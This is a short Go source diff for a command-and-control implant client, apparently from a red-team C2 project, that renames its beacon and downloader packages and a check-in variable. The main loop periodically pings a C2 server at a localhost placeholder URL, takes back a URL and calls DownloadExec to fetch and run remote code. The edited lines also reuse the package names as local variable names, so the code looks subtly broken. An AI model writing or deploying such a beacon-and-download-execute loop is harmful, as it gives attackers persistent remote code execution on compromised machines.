@@ -1,14 +1,11 @@
 package main
 
 import (
-	"fmt"
 	"math/rand"
-	"os"
-	"runtime"
 	"time"
 
-	"github.com/averagesecurityguy/c2/beacons"
-	"github.com/averagesecurityguy/c2/downloaders"
+	"github.com/averagesecurityguy/c2/beacon"
+	"github.com/averagesecurityguy/c2/downloader"
 )
 
 const url = "http://127.0.0.1:8000"
@@ -19,15 +16,15 @@ const sleep = 60  // In seconds
 
 func main() {
 	sysid := "uuid"
-	checkin := time.Now()
-	beacon := beacons.NewHttpAuthBeacon(sysid, url, agent)
-	downloader := downloaders.NewHttpDownloader(agent)
+	checkIn := time.Now()
+	beacon := beacon.NewHttpAuthBeacon(sysid, url, agent)
+	downloader := downloader.NewHttpDownloader(agent)
 
 	for {
 		if checkIn.Before(time.Now()) {
 			url := beacon.Ping()
 			downloader.DownloadExec(url)
-			checkin = updateCheckinTime()
+			checkIn = updateCheckinTime()
 		}
 
 		time.Sleep(sleep * time.Second)
